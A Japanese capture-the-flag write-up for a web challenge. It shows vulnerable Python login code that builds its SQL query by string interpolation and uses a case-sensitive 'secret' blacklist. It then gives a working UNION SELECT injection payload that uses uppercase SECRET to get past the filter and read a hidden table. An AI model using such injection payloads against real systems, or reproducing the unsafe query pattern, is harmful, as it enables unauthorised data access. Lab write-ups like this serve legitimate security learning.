# secret-table

| TOPIC | GENRE | LEVEL |
| --- | --- | --- |
| SQL | Web | Medium |


## 問題概要

脆弱性があるって？でも秘密のテーブルにはアクセスできないはず...

## 解法

### 1. ソースコードの確認

`secret` という文字列を検知するブラックリスト方式のWAFが実装されている。

```python
for value in [username, password]:
    if "secret" in value:
        return "The table is secret!"

query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}';"
error = None

try:
    user = conn.execute(query).fetchone()
except sqlite3.Error as e:
    user = None
    error = str(e)
conn.close()

if error:
    return f"SQL error: {error}"

if user is None:
    return "invaild credentials"

return f"Hello, {user[0]}!"

```

### 2. 攻撃手法

* 方針: `UNION` を用いて `SECRET` テーブルを結合する。
* 注意点: フィルタリングにより `secret` は使えないが、WAFが不完全なため、`SECRET` で代用できる。

#### 成功したペイロード (Writeup参照)

password欄に以下を入力：

```sql
' UNION SELECT flag, '' FROM SECRET --

```

これによってフラグを入手。

#### 試行錯誤のプロセス

自力で解こうとした際は、以下のサブクエリで文字列結合を試したが、`no such column: flag` となり失敗した。

```sql
' UNION SELECT flag, 'x' FROM (SELECT "s"||"e"||"c"||"r"||"e"||"t") --

```

---

### 振り返り

#### 自力で到達できたところ

* `UNION` を用いて表を結合するという着眼点。

#### できなかったところ

* **WAFの回避**: 大文字（`SECRET`）で検知を回避できる点に気づけなかった。
* **UNIONの理解**: 結合先のカラム数やテーブル参照の正しい構文。

---
